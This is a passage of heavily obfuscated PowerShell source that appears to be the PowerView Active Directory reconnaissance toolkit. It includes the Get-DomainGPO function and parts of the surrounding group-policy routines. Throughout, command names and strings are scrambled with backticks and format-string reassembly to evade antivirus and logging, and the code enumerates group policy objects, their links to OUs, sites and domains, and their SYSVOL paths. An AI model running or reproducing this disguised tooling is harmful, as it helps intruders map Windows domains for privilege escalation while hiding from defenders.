                    if (${_}."fIl`TE`Rs") {
                        ${f`I`lters} = ${_}."FI`LTE`RS".("{1}{0}{3}{2}" -f 'e','G','ator','tEnumer').Invoke() | &("{0}{2}{3}{1}"-f 'F','t','orEach-Ob','jec') {
                            &("{2}{0}{1}" -f'Obj','ect','New-') -TypeName ("{1}{0}"-f'ject','PSOb') -Property @{("{1}{0}" -f 'e','Typ') = ${_}."LO`Ca`l`NAme";("{0}{1}"-f'Val','ue') = ${_}."NA`ME"}
                        }
                    }
                    else {
                        ${FI`L`TeRS} = ${n`UlL}
                    }

                    if (${M`eMB`ers} -isnot [System.Array]) { ${m`E`Mbers} = @(${meMB`ers}) }

                    ${G`Ro`UPSXML} = &("{2}{0}{1}" -f 'w-Obj','ect','Ne') ("{2}{0}{1}"-f 'Objec','t','PS')
                    ${gR`OUPs`x`ML} | &("{1}{2}{0}"-f 'er','Add','-Memb') ("{2}{0}{1}{3}" -f 'teprope','rt','No','y') ("{1}{0}"-f 'OPath','GP') ${TarG`e`Tg`R`oUpSXMlPAtH}
                    ${GROup`sx`mL} | &("{1}{3}{2}{0}"-f'er','A','mb','dd-Me') ("{0}{2}{1}{3}" -f 'Note','pe','pro','rty') ("{2}{0}{1}"-f 'te','rs','Fil') ${F`i`lTERs}
                    ${GRO`U`psxML} | &("{2}{1}{0}"-f 'r','be','Add-Mem') ("{1}{2}{0}"-f'perty','Note','pro') ("{2}{1}{0}" -f'e','oupNam','Gr') ${groU`pna`mE}
                    ${g`RouP`SX`ML} | &("{1}{0}{2}" -f'dd-Memb','A','er') ("{2}{0}{1}" -f'otepro','perty','N') ("{1}{0}"-f'pSID','Grou') ${G`ROU`Psid}
                    ${gro`Up`s`Xml} | &("{0}{1}{2}"-f 'Add-Memb','e','r') ("{1}{2}{0}" -f'y','Noteproper','t') ("{4}{3}{2}{0}{1}" -f'r','Of','Membe','oup','Gr') ${nu`Ll}
                    ${gR`OuPsX`ML} | &("{2}{1}{0}"-f 'mber','dd-Me','A') ("{3}{0}{1}{2}"-f 'otepr','opert','y','N') ("{1}{2}{3}{0}"-f 'ers','Gr','oup','Memb') ${me`MB`ERs}
                    ${GR`OU`PSx`mL}."PSobJ`e`ct"."TYP`ENAm`Es".("{1}{0}{2}"-f'se','In','rt').Invoke(0, ("{2}{4}{0}{5}{1}{3}"-f'r','oupsXM','Po','L','we','View.Gr'))
                    ${G`RouP`sX`Ml}
                }
            }
        }
        catch {
            &("{3}{2}{0}{1}" -f 'e-Verbos','e','it','Wr') ('[Ge'+'t-GroupsX'+'ML] '+'E'+'rror '+'p'+'arsi'+'ng '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {
        
        ${map`P`EDpAths}."KE`ys" | &("{2}{4}{1}{0}{3}"-f'ach-Objec','rE','F','t','o') { &("{1}{2}{0}{4}{3}{5}" -f've-R','Rem','o','ne','emoteCon','ction') -Path ${_} }
    }
}


function Ge`T-do`m`AingPo {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}"-f 'PSS','houldProces','s'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{1}{3}{5}{6}{0}" -f 'ts','MoreTh','PSUseDeclaredV','anAs','ars','sign','men'}, '')]
    [OutputType({"{1}{3}{2}{0}" -f 'w.GPO','Pow','e','erVi'})]
    [OutputType({"{3}{0}{1}{2}"-f 'ew.','GP','O.Raw','PowerVi'})]
    [CmdletBinding(defauLtpaRaMETeRseTNaME = {"{0}{1}"-f'No','ne'})]
    Param(
        [Parameter(pOsiTioN = 0, VALUefRoMpIpeLInE = ${TR`Ue}, vALUEfromPIPElINeBypRopERTYnAMe = ${tr`UE})]
        [Alias({"{0}{2}{3}{4}{1}"-f 'Dist','me','inguished','N','a'}, {"{2}{0}{4}{1}{3}" -f'A','am','Sam','e','ccountN'}, {"{1}{0}"-f 'e','Nam'})]
        [String[]]
        ${IdEN`Ti`Ty},

        [Parameter(parAMeTERSEtnAMe = "COMputErIdE`NT`i`Ty")]
        [Alias({"{0}{3}{1}{2}"-f'Co','rNam','e','mpute'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${c`O`MpUT`E`RIdENTity},

        [Parameter(pARAMETErSEtNaME = "u`se`RIdEn`TiTY")]
        [Alias({"{0}{1}{2}" -f 'Use','r','Name'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${UsER`Id`eNt`Ity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`mA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ilter','F'})]
        [String]
        ${l`d`ApF`ILtER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prope`R`TiES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'ADS','Pat','h'})]
        [String]
        ${seaRc`hba`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}" -f'Con','Domain','trolle','r'})]
        [String]
        ${seR`VeR},

        [ValidateSet({"{0}{1}"-f'B','ase'}, {"{1}{2}{0}" -f'vel','O','neLe'}, {"{2}{1}{0}"-f 'btree','u','S'})]
        [String]
        ${SEa`R`CHs`CoPe} = ("{1}{0}" -f'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResuLtPA`G`eSI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`er`Ver`Time`LI`mIT},

        [ValidateSet({"{1}{0}" -f 'acl','D'}, {"{0}{1}" -f'Grou','p'}, {"{0}{1}" -f'Non','e'}, {"{1}{0}"-f'r','Owne'}, {"{0}{1}"-f'Sac','l'})]
        [String]
        ${se`cUr`iT`YMAs`KS},

        [Switch]
        ${T`OmbS`TonE},

        [Alias({"{1}{0}{2}" -f 'rn','Retu','One'})]
        [Switch]
        ${fI`Nd`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREdenT`i`Al} =  (GeT-VarIAbLe  ('7t'+'q02') )."v`AluE"::"emp`TY",

        [Switch]
        ${r`AW},

        [Switch]
        ${s`SL},

        [Switch]
        ${oBFuSC`A`TE}
    )

    BEGIN {
        ${SE`ArCh`ErA`Rg`UMEN`Ts} = @{}
        if (${p`sBou`NdP`A`RaME`Ters}[("{1}{0}{2}" -f 'a','Dom','in')]) { ${S`EA`RcHERaRG`U`M`ents}[("{0}{1}"-f'Do','main')] = ${dO`m`Ain} }
        if (${PSB`oUND`p`A`RAmEt`erS}[("{3}{2}{0}{1}"-f'ert','ies','rop','P')]) { ${SeAR`CHeRa`R`G`UMeNTs}[("{2}{0}{1}" -f'r','operties','P')] = ${Prop`eRT`Ies} }
        if (${pSBOUn`d`p`A`RAmEtERs}[("{1}{0}{2}" -f 'arch','Se','Base')]) { ${SeARc`hE`Rar`G`UmEnts}[("{3}{2}{0}{1}"-f'ch','Base','ar','Se')] = ${s`eA`R`CHbAsE} }
        if (${ps`B`o`UNdpa`Ramete`Rs}[("{0}{1}" -f'Ser','ver')]) { ${sEaRChE`R`ArGum`EnTs}[("{0}{1}" -f'Se','rver')] = ${s`eRvER} }
        if (${p`sbO`UndpA`Ramet`eRs}[("{0}{1}{2}" -f 'Sea','rch','Scope')]) { ${S`ea`RchERaRG`U`MeNtS}[("{1}{2}{0}"-f 'chScope','S','ear')] = ${seARCh`ScO`pE} }
        if (${PsB`O`UNdP`Ar`AMeTERS}[("{0}{1}{2}"-f 'ResultPa','geSi','ze')]) { ${seArCh`er`ARgU`meN`TS}[("{0}{4}{2}{1}{3}" -f 'Res','a','ltP','geSize','u')] = ${res`Ult`p`AGESIZE} }
        if (${ps`BOuNDParaMe`T`E`RS}[("{3}{0}{2}{4}{1}" -f 'e','Limit','rTim','Serv','e')]) { ${sEaRC`herARG`UMEN`Ts}[("{1}{4}{0}{3}{2}"-f'e','ServerT','mit','Li','im')] = ${s`ervErtIM`eL`IMIt} }
        if (${PsboU`NDp`A`RAMeteRs}[("{3}{1}{2}{0}" -f 'rityMasks','e','cu','S')]) { ${SeAR`Cher`Arg`U`mEntS}[("{1}{2}{0}"-f 's','SecurityMa','sk')] = ${SEC`URItYm`AsKS} }
        if (${psb`Ou`NdPA`R`AmeTE`Rs}[("{1}{0}"-f 'e','Tombston')]) { ${S`E`Arche`RAR`GUme`NTs}[("{1}{0}{2}"-f 'ombston','T','e')] = ${t`Om`BSTO`Ne} }
        if (${psbOu`NDPara`me`TErs}[("{3}{1}{2}{0}"-f'ential','e','d','Cr')]) { ${se`Ar`cHErAR`G`UMe`NTS}[("{0}{3}{2}{1}"-f'Crede','l','tia','n')] = ${c`REdE`Nt`IaL} }
        if (${p`s`BOuNdPa`Ra`MetE`Rs}['SSL']) { ${s`eA`RCHer`AR`GumenTs}['SSL'] = ${s`sL} }
        if (${p`SBoU`NDpa`Ra`MET`erS}[("{3}{0}{2}{1}" -f 'bfusca','e','t','O')]) {${sE`ARCheR`Ar`GuMenTS}[("{2}{0}{1}"-f'bfus','cate','O')] = ${obF`U`Scate} }
    }

    PROCESS {
        if (${PS`B`oUNdp`ARam`ET`eRs}[("{0}{3}{1}{2}" -f 'Com','de','ntity','puterI')] -or ${psb`O`Undp`ARAME`TERS}[("{3}{2}{0}{1}" -f'enti','ty','erId','Us')]) {
            ${GP`o`A`DspATHS} = @()
            if (${sE`ARch`era`RG`UmenTS}[("{1}{2}{0}"-f'ties','P','roper')]) {
                ${oL`DPRoP`eRt`i`Es} = ${SEarCh`e`RA`RGUm`EntS}[("{0}{2}{1}" -f'P','ties','roper')]
            }
            ${S`ea`Rche`R`ARgUMeNtS}[("{1}{0}{2}"-f 'rt','Prope','ies')] = ("{2}{5}{7}{3}{1}{4}{6}{0}"-f'e','ns','dist','e,d','hostna','ingu','m','ishednam')
            ${tARG`EtC`OmPUTERn`Ame} = ${n`UlL}

            if (${p`sbO`UNdpa`Ramete`RS}[("{2}{4}{0}{3}{1}"-f 'er','ntity','C','Ide','omput')]) {
                ${s`EAR`ChE`R`A`RGumEnts}[("{1}{0}" -f 'y','Identit')] = ${c`OmputER`IDEnT`Ity}
                ${Com`pUteR} = &("{2}{5}{3}{4}{1}{0}"-f'puter','om','G','ma','inC','et-Do') @SearcherArguments -FindOne | &("{1}{4}{2}{3}{0}"-f'ct','Sele','t','-Obje','c') -First 1
                if(-not ${compUT`ER}) {
                    &("{1}{0}{2}" -f 'rite-Verbo','W','se') ('[G'+'e'+'t-'+'Domain'+'GPO'+'] '+'Co'+'mpute'+'r '+"'$ComputerIdentity' "+'n'+'ot '+'found'+'!')
                }
                ${ObJEc`T`Dn} = ${CoM`PUT`er}."diSt`iNGu`iSHedN`Ame"
                ${tA`R`gETCoMPut`Erna`mE} = ${com`PuTeR}."d`NS`hOStn`Ame"
            }
            else {
                ${SeaRc`heRa`RGu`mEN`TS}[("{0}{2}{1}"-f 'Id','ntity','e')] = ${USErIDeN`TI`TY}
                ${Us`Er} = &("{1}{3}{2}{0}"-f'r','Get-','inUse','Doma') @SearcherArguments -FindOne | &("{4}{2}{1}{0}{3}"-f'Obj','-','ect','ect','Sel') -First 1
                if(-not ${U`seR}) {
                    &("{0}{1}{2}"-f 'Write-Ver','b','ose') ('[Get'+'-Dom'+'ainGPO]'+' '+'Us'+'er '+"'$UserIdentity' "+'no'+'t '+'fo'+'und'+'!')
                }
                ${oB`J`E`cTdN} = ${Us`ER}."d`istINGUi`s`H`eDnAME"
            }

            
            ${O`BJeCt`oUS} = @()
            ${o`BJE`CtOUS} += ${oBJe`c`TDN}.("{1}{0}"-f'it','spl').Invoke(',') | &("{1}{2}{0}{3}"-f'e','Fo','rEach-Obj','ct') {
                if(${_}.("{1}{2}{0}"-f'swith','st','art').Invoke('OU=')) {
                    ${OBjE`ct`dn}.("{1}{2}{0}"-f 'g','SubStri','n').Invoke(${O`BJ`ECtDN}.("{0}{1}"-f 'Inde','xOf').Invoke("$($_),"))
                }
            }
            &("{2}{1}{3}{4}{0}"-f'bose','e-V','Writ','e','r') ('[Ge'+'t-'+'DomainGPO]'+' '+'obj'+'ec'+'t '+'OUs:'+' '+"$ObjectOUs")

            if (${OB`j`eCtOUs}) {
                
                ${SEarch`eraRg`U`MENTS}.("{1}{0}"-f 'move','Re').Invoke(("{0}{2}{1}" -f'Pr','erties','op'))
                ${iNHErITAn`C`ed`i`sAbL`ed} = ${F`A`lse}
                ForEach(${Ob`JE`CToU} in ${oBJECt`o`US}) {
                    ${SEaRChErA`R`GUM`e`NTS}[("{0}{1}"-f 'Ident','ity')] = ${o`Bje`Ct`oU}
                    ${g`P`OADSPat`HS} += &("{1}{0}{2}" -f'e','G','t-DomainOU') @SearcherArguments | &("{0}{2}{1}{3}" -f 'F','rEach-','o','Object') {
                        
                        if (${_}."g`pli`Nk") {
                            ${_}."g`PliNk"."s`plIt"('][') | &("{0}{2}{1}{3}"-f 'Fo','h-','rEac','Object') {
                                if (${_}.("{0}{1}{3}{2}" -f 'sta','rt','h','swit').Invoke(("{0}{1}" -f'LD','AP'))) {
                                    ${p`A`RtS} = ${_}.("{1}{0}"-f 'plit','s').Invoke(';')
                                    ${GP`ODn} = ${Par`Ts}[0]
                                    ${ENF`O`RCEd} = ${par`Ts}[1]
                                 if (${i`NHeRITA`NCEDIS`A`Bled}) {
                                        
                                        
                                        if (${enfor`CeD} -eq 2) {
                                            ${G`POdN}
                                        }
                                    }
                                    else {
                                        
                                        ${gP`oDN}
                                    }
                                }
                            }
                        }

                        
                        if (${_}."gP`Options" -eq 1) {
                            ${i`NH`Erita`NCediSABlED} = ${t`RuE}
                        }
                    }
                }
            }

            if (${targe`TCo`mPuT`eRN`A`ME}) {
                
                ${coMp`UtE`RsIte} = (&("{5}{0}{2}{6}{3}{1}{4}"-f '-NetC','Na','ompu','e','me','Get','terSit') -ComputerName ${ta`RGE`Tc`O`m`PUt`ernAme})."SitEN`A`Me"
                if(${cOMPUT`Er`sITe} -and (${COmPut`E`R`site} -notlike ("{0}{1}"-f 'Err','or*'))) {
                    ${s`e`ArC`h`eRArG`UmeNTS}[("{1}{2}{0}" -f 'y','Identi','t')] = ${Comp`UTErs`I`TE}
                    ${gPOa`ds`pAT`hs} += &("{2}{1}{0}{4}{3}"-f'mainSi','et-Do','G','e','t') @SearcherArguments | &("{2}{3}{1}{0}"-f'ect','bj','ForEa','ch-O') {
                        if(${_}."gPl`ink") {
                            
                            ${_}."GP`lI`Nk"."SP`lit"('][') | &("{1}{3}{2}{0}"-f'bject','ForEa','h-O','c') {
                                if (${_}.("{0}{1}{2}"-f'star','ts','with').Invoke(("{0}{1}" -f 'LDA','P'))) {
                                    ${_}.("{1}{0}" -f'it','spl').Invoke(';')[0]
                                }
                            }
                        }
                    }
                }
            }

            
            ${oBJ`ECtDomAIn`Dn} = ${ObJeCT`dn}.("{1}{0}" -f'ng','SubStri').Invoke(${ob`jEctdN}.("{1}{0}{2}"-f 'e','Ind','xOf').Invoke('DC='))
            ${S`eArChE`RaRGUmE`NTS}.("{0}{1}"-f 'Remo','ve').Invoke(("{0}{2}{1}"-f'Id','y','entit'))
            ${seAr`che`R`ArguM`ENts}.("{1}{0}{2}"-f'ov','Rem','e').Invoke(("{1}{2}{0}"-f'ies','Prop','ert'))
            ${sEA`RCHErARGU`MEn`Ts}[("{0}{2}{1}"-f 'LDA','ilter','PF')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
            ${Gp`o`AD`SpaThs} += &("{4}{1}{0}{2}{3}" -f 'inOb','t-Doma','jec','t','Ge') @SearcherArguments | &("{3}{0}{1}{2}{4}" -f'Eac','h-','Ob','For','ject') {
                if(${_}."GPL`i`NK") {
                    
                    ${_}."gp`Link"."Sp`lIT"('][') | &("{1}{2}{0}{3}"-f'-Obj','F','orEach','ect') {
                        if (${_}.("{1}{2}{0}" -f 'rtswith','s','ta').Invoke(("{0}{1}"-f 'LDA','P'))) {
                            ${_}.("{1}{0}" -f 'it','spl').Invoke(';')[0]
                        }
                    }
                }
            }
            &("{2}{1}{0}"-f'erbose','-V','Write') ('['+'Get-Domain'+'GPO]'+' '+'G'+'P'+'O'+'Ad'+'sPaths: '+"$GPOAdsPaths")

            
            if (${Ol`d`P`ROPeRTIeS}) { ${SEArCHEra`Rgume`N`Ts}[("{0}{2}{1}" -f 'Pro','es','perti')] = ${OL`dPro`p`ert`iES} }
            else { ${sEaRcHERar`GUmE`N`TS}.("{1}{0}"-f 'move','Re').Invoke(("{0}{1}{2}" -f 'Prope','rti','es')) }
            ${s`earcHE`RAR`gUMeN`TS}.("{1}{0}"-f 'ove','Rem').Invoke(("{0}{1}{2}" -f 'Id','enti','ty'))

            ${GPO`A`Ds`paThS} | &("{1}{2}{0}{3}"-f 're-','W','he','Object') {${_} -and (${_} -ne '')} | &("{3}{2}{1}{0}" -f 't','c','rEach-Obje','Fo') {
                
                ${S`earCH`Er`AR`gu`meNts}[("{1}{2}{0}" -f'Base','Sea','rch')] = ${_}
                ${se`AR`CheR`ARgU`MENtS}[("{1}{2}{0}"-f 'ilter','LDAP','F')] = ("{2}{1}{8}{3}{4}{10}{0}{6}{9}{7}{5}"-f 'cyConta','tCa','(objec','groupP','ol',')','i','er','tegory=','n','i')
                &("{1}{4}{0}{3}{2}"-f 'main','Get','ect','Obj','-Do') @SearcherArguments | &("{0}{1}{2}"-f 'Fo','rEach-Obj','ect') {
                    if (${p`s`Boun`dP`ARAm`ETERs}['Raw']) {
                        ${_}."pso`B`ject"."T`Yp`eNaMES".("{2}{0}{1}"-f'nser','t','I').Invoke(0, ("{1}{2}{0}{3}"-f 'O.','P','owerView.GP','Raw'))
                    }
                    else {
                        ${_}."PS`Obj`eCT"."T`y`PENAmeS".("{2}{1}{0}" -f't','er','Ins').Invoke(0, ("{3}{1}{0}{2}" -f 'ie','V','w.GPO','Power'))
                    }
                    ${_}
                }
            }
        }
        else {
            ${iD`E`N`Ti`TYfiLtER} = ''
            ${fi`lT`er} = ''
            ${iDEn`T`itY} | &("{0}{1}{3}{2}" -f'Wher','e-O','ject','b') {${_}} | &("{2}{1}{0}"-f'bject','-O','ForEach') {
                ${IDen`TI`T`YiNStAnCe} = ${_}.("{2}{0}{1}"-f'c','e','Repla').Invoke('(', '\28').("{0}{1}" -f'R','eplace').Invoke(')', '\29')
                if (${ideNTiT`YINs`TaN`Ce} -match ((("{0}{5}{4}{3}{2}{1}" -f 'L','Kh^CN=.*','/z','/','P:','DA'))."rEPLa`Ce"(([Char]122+[Char]75+[Char]104),[STRIng][Char]124))) {
                    ${i`DeNTI`Ty`FIL`TEr} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PS`Bo`U`NdPAramEterS}[("{2}{1}{0}"-f'n','omai','D')]) -and (-not ${psBOu`Ndp`ARAM`e`TErs}[("{1}{2}{0}"-f'chBase','S','ear')])) {
                        
                        
                        ${I`d`EN`TiTy`dOmaIN} = ${i`de`NTiTYINS`TAn`Ce}.("{1}{0}{2}" -f 'ub','S','String').Invoke(${ide`NTItYInSt`AN`CE}.("{0}{1}{2}"-f 'Ind','exO','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{0}{2}{1}{3}" -f 'Write','e','-V','rbose') ('[Get'+'-'+'D'+'o'+'mainGPO] '+'Extra'+'cte'+'d'+' '+'doma'+'in'+' '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${SEA`RC`heRArGu`M`E`Nts}[("{1}{0}{2}" -f 'a','Dom','in')] = ${ID`EnTi`T`yDOM`AiN}
                        ${GPosea`RcH`eR} = &("{1}{0}{2}{3}"-f'oma','Get-D','inS','earcher') @SearcherArguments
                        if (-not ${GPoSe`A`R`CHEr}) {
                            &("{4}{3}{2}{1}{0}"-f 'ng','i','rn','-Wa','Write') ('[Get'+'-Do'+'ma'+'inGP'+'O] '+'Un'+'able '+'t'+'o '+'retri'+'e'+'ve '+'d'+'om'+'ain '+'s'+'ear'+'cher '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${ID`en`T`itYINS`TaNCE} -match '{.*}') {
                    ${IDen`TIt`yFi`lt`eR} += "(name=$IdentityInstance)"
                }
                else {
                    try {
                        ${gU`idB`ytES`Tr`inG} = (-Join (([Guid]${ID`ENt`I`TYInS`T`ANCE}).("{1}{0}{2}"-f 'y','ToB','teArray').Invoke() | &("{0}{3}{1}{2}" -f 'Fo','h-Ob','ject','rEac') {${_}.("{0}{2}{1}"-f'ToS','ing','tr').Invoke('X').("{0}{2}{1}" -f'Pa','t','dLef').Invoke(2,'0')})) -Replace ("{0}{1}" -f'(','..)'),'\$1'
                        ${id`EntItY`FilTEr} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${idEn`TiTYFi`l`T`eR} += "(displayname=$IdentityInstance)"
                    }
                }
            }
            if (${i`DE`NTItYF`iLteR} -and (${iD`e`NTI`Ty`FiltEr}.("{1}{0}" -f 'm','Tri').Invoke() -ne '') ) {
                ${fIl`T`ER} += "(|$IdentityFilter)"
            }

            if (${pS`BoUnD`PaRaMETE`RS}[("{1}{0}{2}{3}" -f 'Fil','LDAP','te','r')]) {
                &("{1}{0}{2}{3}"-f'e-','Writ','V','erbose') ('[G'+'e'+'t-DomainG'+'P'+'O] '+'U'+'sing '+'add'+'it'+'ional '+'LDAP'+' '+'filter'+': '+"$LDAPFilter")
                ${f`IL`Ter} += "$LDAPFilter"
            }

            ${fi`LtEr} = "(&(objectCategory=groupPolicyContainer)$Filter)"
            &("{2}{0}{1}{3}" -f 'e','-Ve','Writ','rbose') "[Get-DomainGPO] filter string: $($Filter) "

            ${Re`SUltS} = &("{1}{3}{2}{0}" -f 'Query','I','DAP','nvoke-L') @SearcherArguments -LDAPFilter "$Filter"
            ${r`EsU`LtS} | &("{1}{3}{0}{2}" -f '-O','Whe','bject','re') {${_}} | &("{1}{2}{0}"-f 'Object','ForEa','ch-') {
                if (${P`SbOuN`d`PaR`AM`EtERs}['Raw']) {
                    
                    ${g`po} = ${_}
                    ${g`po}."pS`OB`Ject"."TYp`en`AMEs".("{1}{0}" -f 'nsert','I').Invoke(0, ("{0}{3}{2}{1}" -f'Pow','w.GPO.Raw','e','erVi'))
                }
                else {
                    if (&("{3}{1}{2}{0}" -f 'r','t-Mem','be','Ge') -inputobject ${_} -name ("{0}{3}{1}{2}"-f 'Attr','bute','s','i') -Membertype ("{2}{0}{1}" -f 'roper','ties','P')) {
                        ${P`Rop} = @{}
                        foreach (${a} in ${_}."a`TT`RiBu`Tes"."Ke`ys" | &("{0}{2}{3}{1}"-f'Sort','ct','-','Obje')) {
                            if ((${A} -eq ("{0}{1}{2}" -f'o','bjec','tsid')) -or (${A} -eq ("{1}{0}{2}"-f 'i','sidh','story')) -or (${a} -eq ("{2}{0}{1}" -f'ectgui','d','obj')) -or (${a} -eq ("{1}{0}{2}{3}" -f 'serc','u','ertif','icate')) -or (${a} -eq ("{2}{5}{1}{4}{3}{0}"-f'or','urityd','n','cript','es','tsec')) -or (${A} -eq ("{0}{1}{2}"-f 'log','onhou','rs'))) {
                                ${pR`Op}[${A}] = ${_}."AtTRIBU`T`Es"[${a}]
                            }
                            else {
                                ${Va`luEs} = @()
                                foreach (${v} in ${_}."at`TrIbu`TeS"[${A}]."G`Et`V`ALueS"([byte[]])) {
                                    ${v`A`LUES} +=  ( vArIAble  ("{1}{0}" -f'1lC','M')  -vAluEON)::"uT`F8"."gE`T`StrIng"(${v})
                                }
                                ${p`ROP}[${a}] = ${V`A`lUES}
                            }
                        }
                    }
                    else {
                        ${PR`oP} = ${_}."p`Ro`PErTIeS"
                    }

                    if (${pSBo`UNdP`A`RAME`Te`Rs}[("{3}{2}{0}{1}" -f 'Ba','se','h','Searc')] -and (${s`ea`R`cHBaSE} -Match ("{1}{0}"-f'//','^GC:'))) {
                        ${g`PO} = &("{1}{2}{0}{3}" -f'D','Con','vert-L','APProperty') -Properties ${P`Rop}
                        try {
                            ${G`pOdN} = ${g`Po}."d`iSTi`NGUIsh`edN`AME"
                            ${g`PodoM`AIN} = ${g`POdn}.("{0}{3}{1}{2}"-f'Sub','trin','g','S').Invoke(${g`pOdN}.("{1}{0}{2}" -f'exO','Ind','f').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            ${gPcFIL`eSys`p`ATh} = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                            ${g`Po} | &("{1}{0}{2}{3}" -f'-M','Add','em','ber') ("{1}{2}{0}{3}" -f'er','Notep','rop','ty') ("{4}{0}{3}{1}{2}" -f'le','ysp','ath','s','gpcfi') ${GPc`FILe`S`ysPaTh}
                        }
                        catch {
                            &("{2}{0}{4}{3}{1}" -f'it','erbose','Wr','V','e-') "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                        }
                    }
                    else {
                        ${G`po} = &("{5}{0}{2}{1}{3}{4}" -f'on','e','v','rt-LDAPProper','ty','C') -Properties ${pr`oP}
                    }
                    ${G`Po}."P`SoBje`cT"."t`Ypen`A`mES".("{0}{1}"-f 'Ins','ert').Invoke(0, ("{0}{2}{1}" -f 'PowerV','w.GPO','ie'))
                }
                ${g`po}
            }
            if (${Res`Ul`Ts}) {
                try { ${REsu`l`TS}.("{1}{0}"-f 'pose','dis').Invoke() }
                catch {
                    &("{1}{0}{2}{3}"-f 'rite-Verb','W','o','se') ('[Ge'+'t-D'+'o'+'mainGP'+'O] '+'Erro'+'r'+' '+'d'+'isposi'+'ng '+'o'+'f '+'t'+'he '+'Re'+'s'+'ults '+'objec'+'t: '+"$_")
                }
            }
        }
    }
}


function gEt`-`DomAin`GPolO`cal`GR`oUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f'PSShoul','dP','rocess'}, '')]
    [OutputType({"{0}{1}{3}{2}{4}"-f 'PowerVi','ew.GPOG','u','ro','p'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSiTIoN = 0, vALueFROmPIPELINE = ${tR`Ue}, vALUEfROMPIPeliNebyPRoPErTYnAME = ${tR`UE})]
        [Alias({"{3}{0}{2}{1}{5}{4}" -f 'ing','ed','uish','Dist','ame','N'}, {"{0}{3}{4}{2}{1}"-f'Sa','Name','t','mAcc','oun'}, {"{1}{0}" -f'me','Na'})]
        [String[]]
        ${iD`EnT`ITy},

        [Switch]
        ${RE`SOLv`eMemb`ErsTosIDS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOmA`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ter','Fil'})]
        [String]
        ${lDAP`F`iL`TeR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'ADSPat','h'})]
        [String]
        ${Se`AR`chbASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{0}{2}{1}" -f'ro','ler','l','Do','mainCont'})]
        [String]
        ${s`eR`VEr},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{2}{1}{0}"-f 'l','Leve','One'}, {"{0}{1}"-f'Subtre','e'})]
        [String]
        ${sear`C`hs`cOPe} = ("{0}{1}" -f'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSUlt`P`A`GESIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serVER`T`iMel`imiT},

        [Switch]
        ${tO`mbSt`oNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`DEnti`Al} =  (  VARIaBLe  ('7t'+'Q02'))."Va`luE"::"eMp`Ty"
    )

    BEGIN {
        ${S`Ea`RChErA`R`g`UMEnts} = @{}
        if (${pSBo`UND`p`A`RAmeteRs}[("{2}{1}{0}"-f'main','o','D')]) { ${sEaRcHeR`Ar`GU`m`eNtS}[("{1}{0}" -f'omain','D')] = ${do`M`Ain} }
        if (${PsB`ouNDPARAME`Te`RS}[("{2}{1}{0}" -f 'ilter','APF','LD')]) { ${SeARChE`RArGu`ME`NTs}[("{2}{1}{3}{0}"-f'er','i','LDAPF','lt')] = ${D`omAiN} }
        if (${pSB`OuN`d`paraM`EteRs}[("{1}{2}{0}" -f'Base','Sear','ch')]) { ${SeaRchEraRG`U`ME`Nts}[("{0}{1}{2}"-f'S','ear','chBase')] = ${SEaRC`HB`Ase} }
        if (${p`s`B`O`UnDpARamet`eRS}[("{1}{0}" -f'r','Serve')]) { ${SeA`RChEra`RGU`m`EnTS}[("{1}{0}"-f'rver','Se')] = ${seR`VEr} }
        if (${psB`oUNDPar`AMeT`ErS}[("{1}{2}{0}" -f'cope','Se','archS')]) { ${Se`Ar`CHe`R`A`RguMEntS}[("{0}{1}{2}" -f'Search','Sco','pe')] = ${S`e`AR`cHsCOPe} }
        if (${psB`ou`NdparaM`eTErs}[("{2}{0}{1}{3}"-f'tPa','g','Resul','eSize')]) { ${seArC`HERa`Rg`U`meNtS}[("{0}{3}{2}{1}"-f 'R','PageSize','lt','esu')] = ${re`s`ULTPaGES`ize} }
        if (${P`SBOu`NdPa`Ra`mEtErS}[("{1}{0}{3}{2}" -f 'verT','Ser','it','imeLim')]) { ${S`eaRCHER`ARg`U`Me`Nts}[("{2}{3}{4}{1}{0}"-f't','i','ServerTime','Li','m')] = ${S`e`RVErT`imeL`Im`iT} }
        if (${PsBO`U`NDpARaM`e`TeRS}[("{2}{0}{1}"-f 'ston','e','Tomb')]) { ${sea`R`C`HERARgUmentS}[("{0}{3}{2}{1}"-f 'To','e','ston','mb')] = ${to`mbSt`o`Ne} }
        if (${psb`oUndPARAME`T`eRS}[("{3}{2}{0}{1}"-f 'en','tial','red','C')]) { ${s`EA`R`c`her`ArGuMENTS}[("{1}{2}{0}"-f 'l','Creden','tia')] = ${C`R`EdE`NTiAL} }

